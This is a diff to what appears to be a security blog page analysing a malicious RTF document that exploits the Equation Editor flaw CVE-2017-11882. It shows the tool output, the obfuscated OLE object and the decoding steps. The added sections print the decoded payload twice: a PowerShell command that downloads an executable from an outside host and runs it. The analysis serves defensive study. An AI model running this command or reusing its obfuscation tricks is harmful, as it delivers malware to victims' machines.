@@ -71,10 +71,60 @@
 			<p>What makes this exploit useful for an adversary is it only requires a victim to open the maldoc. There is no need to enable a macro or provide any other additional input.</p>
 			<br>
 			<h2>Maldoc analysis</h2>
-			<p>Opening the maldoc in a hex editor reveals it is a RTF document. In contrast to your typical OOXML document (.docx, .docm, .xlsx, .xlsm, etc.) which contain OLE2 type objects and macros; RTF documents can't contain macros but they can contain OLE1 type objects.
+			<p>Opening the maldoc in a hex editor reveals it is a RTF document. In contrast to your typical OOXML document (.docx, .docm, .xlsx, .xlsm, etc.) which can contain OLE2 type objects and macros; RTF documents can't contain macros but they can contain OLE1 type objects.
 				An OLE object can contain files, or in this case, an Equation Editor 3.0 object. </p>
 				<br>
 				<p>To verify there is an OLE1 type object embedded in this document you can use <a href="https://blog.didierstevens.com/" target="_blank">Didier Stevens</a> <a href="https://github.com/decalage2/oletools" target="_blank">OLETools</a> script <code>rtfobj.py</code>: </p>
+				<br>
+				<!-- rtfobj Code-->
+			<pre><code class="language-none">
+					===============================================================================
+					File: 'sp.doc' - size: 226881 bytes
+					---+----------+---------------------------------------------------------------
+					id |index     |OLE Object                                                     
+					---+----------+---------------------------------------------------------------
+					0  |00000110h |Not a well-formed OLE object                                   
+					---+----------+---------------------------------------------------------------
+					1  |000000C8h |format_id: 2 (Embedded)                                        
+					   |          |class name: 'dsfmiusg.4'                                       
+					   |          |data size: 3584                                                
+					   |          |MD5 = '1b99ffd605198d9a7ecab99e72188489'                       
+					   |          |CLSID: 0002CE02-0000-0000-C000-000000000046                    
+					   |          |Microsoft Equation 3.0 (Known Related to CVE-2017-11882 or     
+					   |          |CVE-2018-0802)                                                 
+					---+----------+---------------------------------------------------------------
+			</code></pre>
+			<br>
+			<p>To extract the OLE1 object you can Didier Steven's <code>rtfdump.py</code>. This maldoc makes use of a few interesting tactics to obfuscate it's payload so let's manually decode the OLE1 object.
+			The OLE1 object has 341 lines of what you see below. </p>
+			<!-- sp.doc Code-->
+			<pre><code class="language-none">
+...
+{\f0669 0 \bil 1 \bil 0 \bil 5 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 2 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil B \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 6 \bil 4 \bil 7 \bil 3 \bil 6 \bil 6 \bil 6 \bil d \bil 6 \bil 9 \bil 7 \bil 5 \bil 7 \bil 3 \bil 6 \bil 7 \bil 2 \bil e \bil 3 \bil 4 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil E \bil 0 \bil 0 \bil 0 \bil 0 \bil D \bil 0 \bil C \bil F \bil 1 \bil 1 \bil E \bil 0 \bil A \bil 1 \bil B \bil 1 \bil 1 \bil A \bil E \bil 1 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil 0 \bil  }
+...
+			</code></pre>
+			<p>There are two obfuscation techniques employed by this maldoc; <code>fictitious control words</code> and <code> white space evasions</code>. RTF documents use control words like <code>\objdata</code> to instruct readers and take advantage of RTF features. However, if an unknown control word is preceded by <code>'{\*'</code> then the reader will ignore the destination group. In this case <code>\f0669</code> and <code>\bil</code> are not control words a reader would recognize and would be ignored. In general, extra whitespaces in the OLE1 object hex stream are ignored. After removing the whitespaces and control words we are left with a hex stream.   </p>
+			<!-- hex stream Code-->
+			<pre><code class="language-none">
+...
+{01050000020000000B0000006473666d697573672e34000000000000000000000E0000D0CF11E0A1B11AE100000000000000}
+...
+			</code></pre>
+			<p>Decoding the hex stream reveals the payload:</p>
+			<!-- hex decode Code-->
+			<pre><code class="language-none">
+Root Entry..ÿÿÿÿÿÿÿÿ..Î.ÀFp÷ÞÏdÓ..À..Ole
+..ÿÿÿÿÿÿÿÿÿÿÿÿ..CompObj.....ÿÿÿÿ.f.ObjInfo...ÿÿÿÿ.ÿÿÿÿ..þÿÿÿ.þÿÿÿþÿÿÿ....	
+..
+..Î.ÀF.Microsoft Equation Native 3.0.DS dsfmiusg.dsfmiusg.4ô9²q....¨Ã..H.]l.[....				
+..ZZ¸Dëq.ºxV4.1Ð...	.	f.Ár.1Öÿ.Sf.îLÿ....!@cmd.exe /c PowerShell "try{$p=$env:temp+'\Y.exe';Import-Module BitsTransfer;Start-BitsTransfer -Source 'http://peveyhack.com/css/page/sky.exe' -Destination $p;(New-Object -com Shell.Application).ShellExecute( $p);}catch{}"
+...
+			</code></pre>
+			<p>When the font name buffer overflows in the Microsoft Equation Editor (eqnedt32.exe) the below script (<a href="https://attack.mitre.org/techniques/T1064/" target="_blank">T1064</a>) is executed. This script employs PowerShell (<a href="https://attack.mitre.org/techniques/T1086/" target="_blank">T1086</a>) and a BITS job (<a href="https://attack.mitre.org/techniques/T1197/" target="_blank">T1197</a>) to attempt to retrieve the executable <code>sky.exe</code>, save it to the temp directory with the name <code>Y.exe</code> and execute it.</p>
+			<!-- script Code-->
+			<pre><code class="language-none">
+cmd.exe /c PowerShell "try{$p=$env:temp+'\Y.exe';Import-Module BitsTransfer;Start-BitsTransfer -Source 'http://peveyhack.com/css/page/sky.exe' -Destination $p;(New-Object -com Shell.Application).ShellExecute( $p);}catch{}"
+				</code></pre>
 			<h3>Persistence</h3>
 			<h3>Privilege Escalation</h3>
 			<h3>Credential Access</h3>
